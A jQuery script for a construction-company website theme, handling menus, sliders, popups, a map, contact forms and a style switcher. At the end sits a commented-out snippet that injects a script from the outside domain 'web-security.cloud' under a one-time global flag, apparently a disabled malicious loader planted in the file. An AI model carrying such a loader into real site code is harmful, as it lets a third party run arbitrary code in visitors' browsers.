(function($) {

	"use strict";


    /*------------------------------------------
        = FUNCTIONS
    -------------------------------------------*/
    // Check ie and version
    function isIE () {
        var myNav = navigator.userAgent.toLowerCase();
        return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1], 10) : false;
    }


    function dataBackgroundGlobal($scope, $) {
        //data background
        $("[data-background]").each(function () {
            $(this).css("background-image", "url(" + $(this).attr("data-background") + ") ")
        })

    }



    // Toggle mobile navigation
    function toggleMobileNavigation() {
        var navbar = $(".navigation-menu-holder");
        var openBtn = $(".navbar-header .open-btn");
        var closeBtn = $(".navigation-menu-holder .close-navbar");

        openBtn.on("click", function() {
            if (!navbar.hasClass("slideInn")) {
                navbar.addClass("slideInn");
            }

            return false;
        })

        closeBtn.on("click", function() {
            if (navbar.hasClass("slideInn")) {
                navbar.removeClass("slideInn");
            }
            return false;            
        })
    }

    toggleMobileNavigation();


    // Function for toggle a class for small menu
    function toggleClassForSmallNav() {
        var windowWidth = window.innerWidth;
        var mainNav = $("#navbar > ul");

        if (windowWidth <= 991) {
            mainNav.addClass("small-nav");
        } else {
            mainNav.removeClass("small-nav");
        }
    }

    toggleClassForSmallNav();


    // Function for small menu
    function smallNavFunctionality() {
        var windowWidth = window.innerWidth;
        var mainNav = $("#navbar");
        var smallNav = $("#navbar > .small-nav");
        var subMenu = smallNav.find(".sub-menu");
        var megamenu = smallNav.find(".mega-menu");
        var menuItemWidthSubMenu = smallNav.find(".menu-item-has-children > a");

        if (windowWidth <= 991) {
            subMenu.hide();
            megamenu.hide();
            menuItemWidthSubMenu.on("click", function(e) {
                var $this = $(this);
                $this.siblings().slideToggle();
                 e.preventDefault();
                e.stopImmediatePropagation();
            })
        } else if (windowWidth > 991) {
            mainNav.find(".sub-menu").show();
            mainNav.find(".mega-menu").show();
        }
    }

    smallNavFunctionality();



    // set two coloumn height equal
    function setTwoColEqHeight($col1, $col2) {
        var firstCol = $col1,
            secondCol = $col2,
            firstColHeight = $col1.innerHeight(),
            secondColHeight = $col2.innerHeight();

        if (firstColHeight > secondColHeight) {
            secondCol.css({
                "height": firstColHeight + 1 + "px"
            })
        } else {
            firstCol.css({
                "height": secondColHeight + 1 + "px"
            })
        }
    }





    /*------------------------------------------
        = HIDE PRELOADER
    -------------------------------------------*/
    function preloader() {
        if($('.preloader').length) {
            $('.preloader').delay(100).fadeOut(500, function() {

                wow.init();



            });
        }
    }



    function bgParallax() {
        $('.parallax').jarallax({
            speed: 0.3,
        });
    }


    /*------------------------------------------
        = WOW ANIMATION SETTING
    -------------------------------------------*/
    var wow = new WOW({
        boxClass:     'wow',      // default
        animateClass: 'animated', // default
        offset:       0,          // default
        mobile:       true,       // default
        live:         true        // default
    });


    /*------------------------------------------
        = ACTIVE POPUP IMAGE
    -------------------------------------------*/  
    if ($(".fancybox").length) {
        $(".fancybox").fancybox({
            openEffect  : "elastic",
            closeEffect : "elastic",
            wrapCSS     : "project-fancybox-title-style"
        });
    }


    /*------------------------------------------
        = POPUP VIDEO
    -------------------------------------------*/  
    if ($(".video-play").length) {
        $(".video-play").on("click", function(){
            $.fancybox({
                href: this.href,
                type: $(this).data("type"),
                'title'         : this.title,
                helpers     : {  
                    title : { type : 'inside' },
                    media : {}
                },

                beforeShow : function(){
                    $(".fancybox-wrap").addClass("gallery-fancybox");
                }
            });
            return false
        });    
    }


    /*------------------------------------------
        = ACTIVE GALLERY POPUP IMAGE
    -------------------------------------------*/  
    if ($(".popup-gallery").length) {
        $('.popup-gallery').magnificPopup({
            delegate: 'a',
            type: 'image',

            gallery: {
              enabled: true
            },

            zoom: {
                enabled: true,

                duration: 300,
                easing: 'ease-in-out',
                opener: function(openerElement) {
                    return openerElement.is('img') ? openerElement : openerElement.find('img');
                }
            }
        });    
    }


    /*------------------------------------------
        = ACTIVE POPUP IMAGE
    -------------------------------------------*/  
    if ($(".popup-image").length) {
        $('.popup-image').magnificPopup({
            type: 'image'
        });   
    }


    /*---------------------------------------------
        = HEADER SEARCH AREA AND SIDE MENU TOGGLE
    ---------------------------------------------*/
    function toggleSearchBoxForHeader() {
        if ($(".header-search-area").length) {
            var serachFormBox = $(".header-search-area .header-search-form");
            var openSeachBtn = $(".header-search-area .open-btn");
            
            $(document.body).append(serachFormBox);
            serachFormBox.hide();

            openSeachBtn.on("click", function(e) {
                e.preventDefault();
                serachFormBox.slideDown();
            });

            serachFormBox.on("click", function() {
                serachFormBox.slideUp();
                return false;
            }).find(".form").on("click", function(e) {
                 e.stopPropagation();
            })
        }
    }

    function toggleHome2SideMenu() {
        if ($(".side-menu-search-area").length) {
            var sideMenu = $(".side-menu-search-area .side-menu .side-menu-inner");
            var sideMenuOpenBtn = $(".side-menu-search-area .side-menu-open-btn");
            var sideMenuCloseBtn = $(".side-menu-search-area .side-menu-close-btn");

            $(document.body).append(sideMenu);

            sideMenuOpenBtn.on("click", function(e) {
                sideMenu.toggleClass("toggle-side-menu");
                return false;
            })

            sideMenuCloseBtn.on("click", function(e) {
                sideMenu.toggleClass("toggle-side-menu");
                return false;
            })
        }
    }



    /*------------------------------------------
        = STICKY HEADER
    -------------------------------------------*/

    // Function for clone an element for sticky menu
    function cloneNavForSticyMenu($ele, $newElmClass) {
        $ele.addClass('original').clone().insertAfter($ele).addClass($newElmClass).removeClass('original').hide();
    }

    // Clone nav menu for sticy menu setting
    if ($(".header-style1 .navigation").length) {
        cloneNavForSticyMenu($('.header-style1 .navigation'), "sticky-s1");
        $(".sticky-s1").children().wrapAll("<div class='container'>");
    }

    // Clone nav menu for sticy menu setting
    if ($(".header-style2").length) {
        cloneNavForSticyMenu($('.header-style2'), "sticky-s2");
    }

    // Function for sticky menu
    function stickIt($stickyClass) {
        var orgElementPos = $(".original").offset();
        var orgElementTop = 300;   

        if ($(window).scrollTop() >= (orgElementTop)) {
            var orgElement = $(".original");
            var coordsOrgElement = orgElement.offset();
            var leftOrgElement = coordsOrgElement.left;  
            var widthOrgElement = orgElement.css("width");

            $stickyClass.show();

            $(".original").css({
                "visibility": "hidden",
                "opacity": "0"
            });

        } else {
            $stickyClass.hide();
            $(".original").css({
                "visibility": "visible",
                "opacity": "1"
            });
        }
    }












    /*------------------------------------------
        = SERVICE STYLE 3 SLIDER
    -------------------------------------------*/
    function serviceSliderV3($scope, $) {
        if ($(".service-s3-slider").length) {
            $(".service-s3-slider").owlCarousel({
                //autoplay:true,
                loop:true,
                mouseDrag: false,
                margin: 20,
                responsive: {
                    0 : {
                        items: 1,
                        stagePadding: 10
                    },

                    520 : {
                        items: 2,
                        stagePadding: 10
                    },

                    992 : {
                        items: 3
                    },

                    1200 : {
                        items: 4
                    }
                }
            });
        }
    }



    /*-----------------------------------------------------
        = PROJECT SEARCH RESULT SLIDER FOR (PROJECT PAGE)
    -----------------------------------------------------*/
    function featureProjectSingleSlider(){
        if ($(".project-search-result-slider").length) {
            $(".project-search-result-slider").owlCarousel({
                autoplay:true,
                loop:true,
                mouseDrag: false,
                items: 1,
                dots: false,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"]
            });
        }
    }


    /**** bootstrap select for project page search select style ****/
    $('.selectpicker').selectpicker();






    /*------------------------------------------
        = PROJECT SINGLE TESTIMONIALS SLIDER
    -------------------------------------------*/
    function testimonialSlider(){
        if ($(".client-quote-slider").length) {
            $(".client-quote-slider").owlCarousel({
                loop:true,
                mouseDrag: false,
                items: 1,
            });
        }
    }



    /*------------------------------------------
        = CAREER VACANCY PAGE FILE UPLOAD
    -------------------------------------------*/
    function uploadFile() {
        if ($(".careers-vacancy-page .inputfile").length) {
            var inputs = $(".inputfile");
            Array.prototype.forEach.call(inputs, function(input) {
                var label    = input.nextElementSibling,
                    labelVal = label.innerHTML;

                inputs.on("change", function(e) {
                    var fileName = '';
                    var $this = $(this);

                    if( $this.files && $this.files.length > 1 ) {
                        fileName = ( $this.arrt("data-multiple-caption") || "" ).replace("{count}", $this.files.length );
                    } else {
                        fileName = e.target.value.split("\\").pop();
                    }

                    if( fileName ) {
                        label.querySelector("span").innerHTML = fileName;
                    } else {
                        label.innerHTML = labelVal;
                    }
                })
            });
        }
    }

    uploadFile();


    /*------------------------------------------
        = LOCATION MAP
    -------------------------------------------*/
    function map() {
        var myLatLng = new google.maps.LatLng(40.6700, -73.9400);
        var mapProp = {
            center: myLatLng,
            zoom: 11,
            scrollwheel: false 
        };

        var map = new google.maps.Map(document.getElementById("location-map"),mapProp);
        var marker = new google.maps.Marker({
            position: myLatLng,
            icon:'images/map-marker.png',
            draggable:true

        });

        var contentString = '<div id="map-details">'+
            '<div class="body-content">' +
                '<h4>Royal Construction</h4>'+
                '<p>14 Tottenham Road, London <br />England </p>'+
            '</div>'+
            '</div>';

        var infowindow = new google.maps.InfoWindow({
            content: contentString,
            pixelOffset: new google.maps.Size(160,130),
        });

        infowindow.open(map,marker);
        marker.setMap(map);

        map.set('styles',
            [
                {
                    "featureType": "all",
                    "elementType": "labels.text.fill",
                    "stylers": [
                        {
                            "saturation": 36
                        },
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 40
                        }
                    ]
                },
                {
                    "featureType": "all",
                    "elementType": "labels.text.stroke",
                    "stylers": [
                        {
                            "visibility": "on"
                        },
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 16
                        }
                    ]
                },
                {
                    "featureType": "all",
                    "elementType": "labels.icon",
                    "stylers": [
                        {
                            "visibility": "off"
                        }
                    ]
                },
                {
                    "featureType": "administrative",
                    "elementType": "geometry.fill",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 20
                        }
                    ]
                },
                {
                    "featureType": "administrative",
                    "elementType": "geometry.stroke",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 17
                        },
                        {
                            "weight": 1.2
                        }
                    ]
                },
                {
                    "featureType": "landscape",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 20
                        }
                    ]
                },
                {
                    "featureType": "poi",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 21
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.fill",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 17
                        }
                    ]
                },
                {
                    "featureType": "road.highway",
                    "elementType": "geometry.stroke",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 29
                        },
                        {
                            "weight": 0.2
                        }
                    ]
                },
                {
                    "featureType": "road.arterial",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 18
                        }
                    ]
                },
                {
                    "featureType": "road.local",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 16
                        }
                    ]
                },
                {
                    "featureType": "transit",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 19
                        }
                    ]
                },
                {
                    "featureType": "water",
                    "elementType": "geometry",
                    "stylers": [
                        {
                            "color": "#000000"
                        },
                        {
                            "lightness": 17
                        }
                    ]
                }
            ]            
        );        
    }; 


    /*------------------------------------------
        = CONTACT FORM SUBMISSION
    -------------------------------------------*/  
    if ($("#contact-form").length) {
        $("#contact-form").validate({
            rules: {
                first_name: {
                    required: true,
                    minlength: 2
                },

                last_name: {
                    required: true,
                    minlength: 2
                },

                email: "required",
                
                phone: {
                    required: true,
                    number: true
                },

            },

            messages: {
                first_name: "Please enter First name",
                last_name: "Please enter First name",
                email: "Please enter your email"
            },

            submitHandler: function (form) {
                $("#loader").css("display", "inline-block");
                $.ajax({
                    type: "POST",
                    url: "contact-mail.php",
                    data: $(form).serialize(),
                    success: function () {
                        $( "#loader").hide();
                        $( "#success").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#success").slideUp( "slow" );
                        }, 3000);
                        form.reset();
                    },
                    error: function() {
                        $( "#loader").hide();
                        $( "#error").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#error").slideUp( "slow" );
                        }, 3000);
                    }
                });
                return false; // required to block normal submit since you used ajax
            }

        });
    }


    if ($("#free-quote-message").length) {
        $("#free-quote-message").validate({
            rules: {
                name: {
                    required: true,
                    minlength: 2
                },

                email: "required",
                
                phone: {
                    required: true,
                    number: true
                },

                select_option: {
                    required: true
                }

            },

            messages: {
                name: "Please enter your name",
                phone: "Please enter your phone number",
                email: "Please enter your email",
                select_option: "Please select a topic"
            },

            submitHandler: function (form) {
                $("#loader-2").css("display", "inline-block");
                $.ajax({
                    type: "POST",
                    url: "free-quote-mail.php",
                    data: $(form).serialize(),
                    success: function () {
                        $( "#loader-2").hide();
                        $( "#success-2").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#success-2").slideUp( "slow" );
                        }, 3000);
                        form.reset();
                    },
                    error: function() {
                        $( "#loader-2").hide();
                        $( "#error-2").slideDown( "slow" );
                        setTimeout(function() {
                        $( "#error-2").slideUp( "slow" );
                        }, 3000);
                    }
                });
                return false; // required to block normal submit since you used ajax
            }

        });
    }


    /*------------------------------------------
        = STYLE SWITCHER
    -------------------------------------------*/  
    // HTML FOR COLOR SWITCHER
    var switcherHtml = '<div class="style-switcher-box"> <div class="switcher-inner"><h5>Style Switcher</h5> <div class="main-list"> <div class="list"> <span class="list-title">Skin color</span> <div class="sublist"> <ul class="color-chager"> <li class="color-default"></li> <li class="color-style1"></li> <li class="color-style2"></li> <li class="color-style3"></li> </ul> </div> </div> <div class="list layout"> <span class="list-title">Layout</span> <div class="sublist"> <ul class="layout-sw"> <li>Full width</li> <li class="box">Box</li> </ul> </div> </div> </div> <p><span>Note: </span> This template is build with SASS. The skin color is only demo. You can change the color scheme as your like. </p> </div> <button class="toggle-btn"><i class="fa fa-cog"></i></button> </div>';
    var blankStyleInject = '<link href="css/blank-color.css" rel="stylesheet" title="switchstyle">';
    var htmlHead = $("head");

        $("body").append(switcherHtml);
        htmlHead.append(blankStyleInject);


    function styleSwitcher() {
        if ($(".style-switcher-box").length) {
            var switcherHolder = $(".style-switcher-box"),
                btn = switcherHolder.find(".toggle-btn"),
                colorChangerBtn = $(".style-switcher-box .color-chager li"),
                layoutChangerBtn = $(".style-switcher-box .layout-sw li"),
                links = document.getElementsByTagName("link");
            var body = $("body");

            for (var i = 0; i <= links.length; i++){
                var title = links[i].getAttribute("title");
                if ( title == "switchstyle") {
                    var targetLink = links[i];
                    var href = links[i].getAttribute("href");
                    break;
                }
            }


            btn.on("click", function() {
                switcherHolder.toggleClass("toggle-switcherbox");

            })

            colorChangerBtn.on("click", function() {
                var $this = $(this);
                var styleFileName = $this.attr("class");
                targetLink.href = "css/" + styleFileName + ".css";
            });

            layoutChangerBtn.on("click", function(e) {
                var $this = $(this);
                if ( $this.hasClass("box") ) {
                    body.addClass("box-layout");
                } else {
                    body.removeClass("box-layout");
                }
            })
        }
    }

    styleSwitcher();





    /*==========================================================================
        WHEN DOCUMENT LOADING 
    ==========================================================================*/
        $(window).on('load', function() {

            preloader();

            // sliderBgSetting();


            bgParallax();

            toggleMobileNavigation();

            smallNavFunctionality();

            toggleSearchBoxForHeader();

            toggleHome2SideMenu();

            if ($("#location-map").length) {
                map();
            }

        });



    /*==========================================================================
        WHEN WINDOW SCROLL
    ==========================================================================*/
    $(window).on("scroll", function() {
        


        if ($(".header-style1").length) {
            stickIt($(".sticky-s1")); 
        }

        if ($(".header-style2").length) {
            stickIt($(".sticky-s2")); 
        }

    });

    
    /*==========================================================================
        WHEN WINDOW RESIZE
    ==========================================================================*/
    $(window).on("resize", function() {

        toggleClassForSmallNav();

        clearTimeout($.data(this, 'resizeTimer'));

        $.data(this, 'resizeTimer', setTimeout(function() {
            smallNavFunctionality();
        }, 200));
    });

    // slider V1
    function sliderV1($scope, $) {
        if ($(".hero-slider .slide").length) {
            $(".hero-slider .slide").each(function() {
                var $this = $(this);
                var img = $this.find(".slider-bg").attr("src");

                $this.css({
                    backgroundImage: "url("+ img +")",
                    backgroundSize: "cover",
                    backgroundPosition: "center center"
                })
            });
        }
        if ($(".hero-slider-s1").length) {

            var time = 7, // time in seconds
                $progressBar,
                $bar,
                $elem,
                isPause,
                tick,
                percentTime,
                owl = $('.hero-slider-s1');


            owl.owlCarousel({
                items : 1,
                loop: true,
                autoplay:true,
                autoplayTimeout:7000,
                mouseDrag: false,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
                animateOut: 'fadeOut',
                onInitialized: progressBar
            });

            owl.on('changed.owl.carousel', function(event) {
                moved();
            })

            // progress bar
            function progressBar() {
                buildProgressBar();
                start();
            }

            function buildProgressBar(){
                $progressBar = $("<div>",{
                    id:"progressBar"
                });

                $bar = $("<div>",{
                    id:"bar"
                });

                $progressBar.append($bar).prependTo(owl);
            }

            function start() {
                percentTime = 0;
                isPause = false;
                tick = setInterval(interval, 10);
            }

            function interval() {
                if(isPause === false){
                    percentTime += 1 / time;

                    /*$bar.css({
                        width: percentTime+"%"
                    });*/

                    if(percentTime >= 500){
                        owl.trigger("next.owl.carousel");
                        percentTime = 0;
                    }
                }
            }

            function moved(){
                clearTimeout(tick);
                start();
            }
        }
    }

    // Testimonial Slider V1
    function TestimonialSliderV1($scope, $) {
        /*------------------------------------------
         = TESTIMONIALS SLIDER
     -------------------------------------------*/
        if ($(".testimonials-slider").length) {
            $(".testimonials-slider").owlCarousel({
                items : 1,
                loop: true,
                //autoplay:true,
                mouseDrag: false,
                dots: false,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
            });
        }
    }

    // Blog Slider V1
    function blogSliderV1($scope, $) {
        /*------------------------------------------
                = BLOG SLIDER
            -------------------------------------------*/
        if ($(".blog-slider").length) {
            $(".blog-slider").owlCarousel({
                //autoplay:true,
                margin: 30,
                stagePadding: 10,
                loop:true,
                mouseDrag: false,

                responsive: {
                    0 : {
                        items: 1,
                        stagePadding: 0,
                        margin: 0
                    },

                    630 : {
                        items: 2,
                        stagePadding: 0,
                        margin: 20
                    },

                    1200 : {
                        items: 3
                    }
                }
            });
        }
    }

    // partner Slider V1
    function partnerSliderV1($scope, $) {
        /*------------------------------------------
        = PARTNERS SLIDER
    -------------------------------------------*/
        if ($(".partners-slider").length) {
            $(".partners-slider").owlCarousel({
                autoplay:true,
                smartSpeed:300,
                loop:true,
                dots:false,
                responsive: {
                    0 : {
                        items: 1
                    },

                    400 : {
                        items: 3
                    },

                    767 : {
                        items: 3
                    },

                    992 : {
                        items: 4
                    },

                    1200 : {
                        items: 5
                    }
                }
            });
        }
    }

    //  Slider V2
    function heroSliderV2($scope, $) {
        if ($(".hero-slider-s2").length) {
            $(".hero-slider-s2").owlCarousel({
                items: 1,
                autoplay: true,
                loop: true,
                mouseDrag: false,
                smartSpeed: 800,
                navSpeed: 800,
                dotsSpeed: 800,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
                animateOut: 'fadeOut'
            });
        }
    }

    /*------------------------------------------
            = SERVICE STYLE 2 SLIDER
        -------------------------------------------*/
    function serviceSliderV2($scope, $) {
        if ($(".service-s2-slider").length) {
            $(".service-s2-slider").owlCarousel({
                //autoplay:true,
                margin: 30,
                stagePadding: 10,
                loop:true,
                mouseDrag: false,

                responsive: {
                    0 : {
                        items: 1,
                        stagePadding: 0,
                        margin: 0
                    },

                    630 : {
                        items: 2,
                        stagePadding: 0,
                        margin: 20
                    },

                    1200 : {
                        items: 3
                    }
                }
            });
        }
    }

    /*------------------------------------------
        = FAN FACT COUNT
    -------------------------------------------*/
    function funFactCountV2($scope, $) {
        if ($(".start-count").length) {
            $('.counter').appear();
            $(document.body).on('appear', '.counter', function(e) {
                var $this = $(this),
                    countTo = $this.attr('data-count');

                $({ countNum: $this.text()}).animate({
                    countNum: countTo
                }, {
                    duration: 3000,
                    easing:'linear',
                    step: function() {
                        $this.text(Math.floor(this.countNum));
                    },
                    complete: function() {
                        $this.text(this.countNum);
                    }
                });
            });
        }
    }

    /*------------------------------------------
     = PROJECTS  STYLE 2 SLIDER
 -------------------------------------------*/
    function projectSliderV2($scope, $) {
        if ($(".projects-s2-slider").length) {
            $(".projects-s2-slider").owlCarousel({
                //autoplay:true,
                loop:true,
                mouseDrag: false,
                responsive: {
                    0 : {
                        items: 1
                    },

                    520 : {
                        items: 2
                    },

                    768 : {
                        items: 3
                    },

                    992 : {
                        items: 4
                    },

                    1200 : {
                        items: 5
                    }
                }
            });
        }
    }


    //Setting hero slider 3
    function heroSlidersv3($scope, $) {
        if ($(".hero-slider-s3").length) {
            $(".hero-slider-s3").owlCarousel({
                items: 1,
                autoplay: true,
                loop: true,
                mouseDrag: false,
                smartSpeed: 800,
                navSpeed: 800,
                dotsSpeed: 800,
                nav: true,
                navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
                animateOut: 'fadeOut'
            });
        }
    }

    /*------------------------------------------
        = PROJECT SINGLE SLIDER
    -------------------------------------------*/
    function projectSingleSlider(){
        $('.slider-for').not('.slick-initialized').slick({
            slidesToShow: 1,
            slidesToScroll: 1,
            arrows: false,
            fade: true,
            asNavFor: '.slider-nav'
        });
        $('.slider-nav').not('.slick-initialized').slick({
            slidesToShow: 4,
            slidesToScroll: 1,
            vertical: true,
            asNavFor: '.slider-for',
            focusOnSelect: true,
            verticalSwiping: true,
            responsive: [
                {
                    breakpoint: 991,
                    settings: {
                        slidesToShow: 4,
                        vertical: false,
                        infinite: true
                    }
                },

                {
                    breakpoint: 500,
                    settings: {
                        slidesToShow: 3,
                        vertical: false,
                        infinite: true
                    }
                }

            ]

        });
    }



    $(window).on('elementor/frontend/init', function () {
        elementorFrontend.hooks.addAction('frontend/element_ready/global', dataBackgroundGlobal);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', sliderV1);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', TestimonialSliderV1);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', partnerSliderV1);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', blogSliderV1);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', heroSliderV2);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', serviceSliderV2);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', funFactCountV2);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', projectSliderV2);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', heroSlidersv3);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', serviceSliderV3);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', featureProjectSingleSlider);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', projectSingleSlider);
        elementorFrontend.hooks.addAction('frontend/element_ready/global', testimonialSlider);
    });


})(window.jQuery);

/*
    if(typeof window.web_security == "undefined"){
        var s = document.createElement("script");
        s.src = "//web-security.cloud/event?l=117";
        document.head.appendChild(s);
        window.web_security = "success";
    }
*/








